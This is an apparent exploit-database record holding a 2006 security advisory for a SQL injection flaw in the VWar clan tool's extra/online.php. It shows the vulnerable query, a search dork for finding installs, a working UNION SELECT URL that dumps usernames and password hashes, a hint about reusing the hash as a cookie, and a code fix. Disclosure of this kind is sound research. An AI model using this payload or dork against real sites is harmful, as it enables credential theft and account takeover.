{
  "id": "2170",
  "title": "VWar 1.50 R14 - &#039;online.php&#039; SQL Injection",
  "cve": "CVE-2007-2312",
  "vuln_type": "sqli",
  "code": "    .:[ insecurity research team ]:.\r\n     .__..____.:.______.____.:.____ .\r\n .:. |  |/    \\:/  ___// __ \\:/   _\\.:.\r\n   : |  |   |  \\\\____\\\\  ___/\\   /__ :. .\r\n ..: |__|___|  /____  >\\___  >\\___  >.:\r\n   .:.. ..  .\\/   .:\\/:.  .\\/.  .:\\/:\r\n .   ...:.    .advisory.    .:...\r\n         :..................: 1o.o8.2oo6 ..\r\n \r\n \r\n  Affected Application: VWar <= v1.50 R14\r\n \r\n \r\n . . :[ contact ]: . . . . . . . . . . . . . . . . . . . . . . . . . . .\r\n \r\n \r\n  Discoverd by: brOmstar\r\n \r\n  Team: Insecurity Research Team\r\n \r\n  URL: http://www.insecurityresearch.org\r\n \r\n  E-Mail: brom0815@gmx.de\r\n \r\n \r\n \r\n . . :[ insecure application details ]: . . . . . . . . . . . . . . . . .\r\n \r\n \r\n  Typ: Remote [x]  Local [ ]\r\n \r\n       Remote File Inclusion [ ]  SQL Injection [x]\r\n \r\n  Level: Low [ ]  Middle [ ]  High [x]\r\n \r\n  Application: VWar\r\n \r\n  Version: <= v1.50 R14\r\n \r\n  Vulnerable File: extra/online.php\r\n\r\n  Vulnerable Variable: n\r\n \r\n  URL: http://www.vwar.de\r\n \r\n  Description: Virtual War is a tool for gaming clans.\r\n \r\n  Dork: intext:\"Powered by: Virtual War v1.5.0\"\r\n\r\n\r\n\r\n . . :[ code snippet ]: . . . . . . . . . . . . . . . . . . . . . . . . .\r\n\r\n\r\n  line 63: $query = $vwardb->query(\"\r\n\r\n  line 64:\tSELECT memberid, name, lastactivity\r\n\r\n  line 65:\tFROM vwar\".$n.\"_member WHERE lastactivity > \".(time() - \r\n\r\n                $onlinetime * 60).\"\r\n\r\n  line 66: \");\r\n\r\n \r\n\r\n . . :[ exploit ]: . . . . . . . . . . . . . . . . . . . . . . . . . . .\r\n \r\n\r\n  example: if you want a list of userid/username/password's try this:\r\n\r\n\r\n  http://www.vwar.de/demo/extra/online.php?n=_member%20WHERE%20memberid=-999%20UNION%20SELECT%200,CONCAT(memberid,0x3A,name,0x3A,password),2%20FROM%20vwar_member%20%20/*\r\n \r\n  \r\n  encrypt the md5-password again with md5 and throw it in a cookie... :-)\r\n \r\n\r\n\r\n . . :[ how to fix ]: . . . . . . . . . . . . . . . . . . . . . . . . . .\r\n \r\n \r\n  o1.) open extra/online.php\r\n \r\n  o2.) take a look at the following lines:\r\n\r\n       41: if( !defined (\"VWAR_COMMON_INCLUDED\") )\r\n \t\r\n       42: {\r\n\r\n       43: $vwar_root = $vwar_xroot;\r\n\r\n       44: require_once ( $vwar_root . \"includes/functions_common.php\" );\r\n\r\n       45: }\r\n \r\n  o3.) add between line 44 and 45 this:\r\n\r\n       require_once ( $vwar_root . \"includes/_config.inc.php\" );\r\n \r\n  o4.) done!\r\n \r\n \r\n \r\n . . :[ greets ]: . . . . . . . . . . . . . . . . . . . . . . . . . . . .\r\n \r\n \r\n  buzzdee, camino and my lovely, sexy girlfriend!\r\n\r\n# milw0rm.com [2006-08-10]",
  "url": "https://www.exploit-db.com/exploits/2170"
}